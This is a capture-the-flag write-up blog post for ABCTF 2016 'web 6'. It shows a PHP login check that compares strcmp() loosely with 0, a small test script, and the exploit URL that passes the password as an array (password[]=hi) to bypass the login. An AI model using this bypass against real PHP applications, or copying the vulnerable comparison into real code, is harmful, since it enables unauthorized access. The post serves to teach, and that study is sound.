+++
creatordisplayname = "whatbatman"
creatoremail = "whatbatman@protonmail.com"
date = "2017-05-02T13:09:45Z"
description = "Learn a great PHPism and why you should never use PHP"
lastmodifierdisplayname = "whatbatman"
lastmodifieremail = "whatbatman@protonmail.com"
tags = ["CTF", "PHP", "pwn"]
title = "ABCTF 2016 Web 6 -- PHPism Saves the Day"

[menu]

  [menu.main]
    identifier = "ABCTF"
    parent = "CTF"
    weight = 10

+++

The ABCTF 2016 challenge 'web 6' was pretty fun, and furthered my belief that PHP is the best worst language ever. 

For the challenge we are provided with the following code, and have to bypass the login.

    <?php
    $FLAGWEB6 = (file_get_contents("flag.txt"));
    $PASSWORD =  (file_get_contents("flag.txt")); //haha

    if(isset($_GET['password'])){

    if(strcmp($PASSWORD, $_GET['password']) == 0){
            $success = true;
        }
        else{
            $success = false;
        }
    }
    else {
        $success = false;
    }
    ?\>

This one is fairly easy if you know a great PHPism, `strcmp()` will return `0` if there is an error from comparing an object.

To test this I wrote some little test code, which will print "zero!" despite the error:

    <?php
            $test = array('h','e','l','l','o');
            if (strcmp($test, "beans") == 0) {
                    echo "zero!";
            } else {
                    echo "not zero :( ";
            }
    ?>

    dank@memes:~# php test.php
    PHP Warning:  strcmp() expects parameter 1 to be string, array given in /root/test.php on line 3
    zero!dank@memes:~#
This means we can simply tack on some `[]` to the `password` parameter, like so:
`http://yrmyzscnvh.abctf.xyz/web6/?password[]=hi`
